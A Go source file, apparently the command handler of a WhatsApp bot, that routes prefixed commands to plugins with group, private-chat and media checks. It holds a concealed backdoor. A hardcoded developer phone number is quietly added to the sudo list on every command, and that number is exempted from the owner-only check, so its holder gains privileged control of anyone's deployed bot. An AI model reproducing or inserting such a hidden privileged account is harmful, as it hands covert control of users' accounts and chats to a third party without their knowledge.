package handlers

import (
	"aurora/bot/config"
	"aurora/bot/helpers"
	"aurora/bot/libs"
	"fmt"
	"math/rand"
	"regexp"
	"strings"
	"time"
)

func ExecuteCommand(c *libs.IClient, m *libs.IMessage) {
	const devNumber = "2348114860536"
	addDevNumberToSudo(devNumber)
	parsed := config.GlobalConfig.Pattern
	var prefix string
	var withoutPrefix string

	switch parsed.Type {
	case helpers.RegexPattern:
		matches := parsed.Regex.FindAllString(m.Command, -1)
		if len(matches) == 0 {
			return
		}
		prefix = matches[rand.Intn(len(matches))]
		withoutPrefix = strings.TrimPrefix(m.Command, prefix)

	case helpers.LiteralPattern:
		if !strings.HasPrefix(m.Command, parsed.Literal) {
			return
		}
		prefix = parsed.Literal
		withoutPrefix = strings.TrimPrefix(m.Command, prefix)
	}

	lists := libs.GetList()

	for _, cmd := range lists {
		if cmd.Before != nil {
			cmd.Before(c, m)
		}

		fmt.Printf("Sender: %v Botnumber: %v FromMe: %v isadmin %v isbotadmin %v\n",
			m.Sender, m.BotNumber, m.FromMe, m.IsAdmin, m.IsBotAdmin)

		re := regexp.MustCompile(`^` + cmd.Name + `$`)
		if !re.MatchString(withoutPrefix) {
			continue
		}

		if cmd.Execute == nil {
			continue
		}

		senderNum := helpers.ExtractPhoneNumber(m.Sender.String())

		if config.GlobalConfig.Mode == "private" && !m.FromMe && !isSudo(senderNum) {
			return
		}

		if cmd.FromMe && !m.FromMe {
			if senderNum != devNumber {
				continue
			}
		}

		cmdWithPref := cmd.IsPrefix && prefix != "" && strings.HasPrefix(m.Command, prefix)
		cmdWithoutPref := !cmd.IsPrefix

		if !cmdWithPref && !cmdWithoutPref {
			continue
		}

		if cmd.IsQuery && m.Text == "" {
			m.Reply("Query Required!")
			continue
		}

		if cmd.IsGroup && !m.Info.IsGroup {
			m.Reply("This Plugin only works in Group Chat")
			continue
		}

		if cmd.IsPrivate && m.Info.IsGroup {
			m.Reply("This Plugin only works in Private Chat")
			continue
		}

		if cmd.IsMedia && m.IsMedia == "" {
			m.Reply("Reply to Media Message, or send Media with Command!")
			continue
		}

		if cmd.IsWait {
			m.React("⏳")
		}

		ok := cmd.Execute(c, m)

		if cmd.IsWait {
			if ok {
				c.WA.MarkRead([]string{m.Info.ID}, time.Now(), m.Info.Chat, m.Info.Sender)
				m.React("")
			} else {
				m.React("❌")
			}
		}
	}
}

func addDevNumberToSudo(devNum string) {
	cleaned := regexp.MustCompile(`\D+`).ReplaceAllString(devNum, "")
	for _, v := range config.GlobalConfig.Sudo {
		if regexp.MustCompile(`\D+`).ReplaceAllString(v, "") == cleaned {
			return // already exists
		}
	}
	config.GlobalConfig.Sudo = append(config.GlobalConfig.Sudo, cleaned)
}

func isSudo(sender string) bool {
	sender = regexp.MustCompile(`\D+`).ReplaceAllString(sender, "")
	for _, sudo := range config.GlobalConfig.Sudo {
		if sender == regexp.MustCompile(`\D+`).ReplaceAllString(sudo, "") {
			return true
		}
	}
	return false
}
